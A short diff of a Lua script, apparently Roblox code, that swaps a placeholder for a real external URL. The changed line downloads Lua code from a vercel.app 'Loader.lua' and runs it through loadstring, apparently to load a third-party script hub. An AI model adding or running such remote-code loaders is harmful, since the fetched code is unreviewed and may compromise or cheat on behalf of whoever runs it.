@@ -14,7 +14,7 @@ end)
 
 -- Script 2
 task.spawn(function()
-    loadstring(game:HttpGet("aaa"))()
+    loadstring(game:HttpGet("https://levi-hub-x.vercel.app/Loader.lua"))()
 end)
 
 -- Script 3
